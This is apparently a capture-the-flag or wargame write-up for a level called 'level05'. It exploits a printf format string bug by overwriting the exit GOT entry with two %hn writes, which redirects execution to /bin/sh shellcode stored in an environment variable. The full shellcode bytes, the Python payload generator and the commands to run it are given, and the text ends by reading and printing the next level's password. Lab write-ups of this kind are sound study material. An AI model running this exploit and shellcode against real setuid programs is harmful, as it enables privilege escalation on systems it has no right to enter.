## 1 - Intro


The program echoes user input through printf and than exits with `exit` function.

There is **string format exploit** possible - where 

address`%`value`d%`arg-position`$n`

attack input is used to override `exit` jump address in GOT

```sh
(gdb) info functions exit
  0x08048370  exit

(gdb) disas 0x08048370
  0x08048370 <+0>:	jmp    *0x80497e0
```

The address: 0x080497e0

## 2 - Arg offset

```sh
./level05
aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
aaaa 64 f7fcfac0 0 0 0 0 ffffffff ffffd6d4 f7fdb000 61616161 20782520
      1    2     3 4 5 6     7        8        8       10 <- Here it is
```

The arg offset: 10


## 3 - The hack

We need to generate 0xffffdf0d (May be different on your setup!) chars with printf
what is 4.294.958.861 this is ***INSANE!***

So we can split the addr overwrite into tow &hn writes


```sh

# Put Shellcode from level01 in ENV with some NOP prefix
export SHELLCODE=`python -c 'print "\x90" * 128 + "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"'`


# Program to get SHELLCODE end address
echo '''
#include <stdio.h>
#include <stdlib.h>
int main ()
{
  printf("%p\n", getenv("SHELLCODE"));
  return 0;
}
''' > /tmp/lvl5env.c
gcc -m32 /tmp/lvl5env.c -o /tmp/lvl5env;

# Get current env address and pass it to the python
/tmp/lvl5env | python -c '''
addr = int(raw_input(''), 16)

# Split value into tow parts with mask
parts = [
    (0xffff0000 & addr) >> 16,
    (0xffff & addr),
]

# Out addresses with offset 
pointers = (
    "0x080497e0"[2:].decode("hex")[::-1] +
    "0x080497e2"[2:].decode("hex")[::-1]
)

# Select lower part first as $n sums all up
first = min(parts)
second = max(parts)

result = (
    pointers +
    # Note the arg num flip based on index in parts
    "%{}d%1{}$hn".format(first - len(pointers), parts.index(second)) +
    "%{}d%1{}$hn".format(second - first, parts.index(first))
)

# Check wired if (see source.c for details)
for c in result:
    assert not (c > ord("@") and c < ord("["))

print result
''' > /tmp/lvl5

cat /tmp/lvl5 - | ./level05

```

The hack is completed!

```sh
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```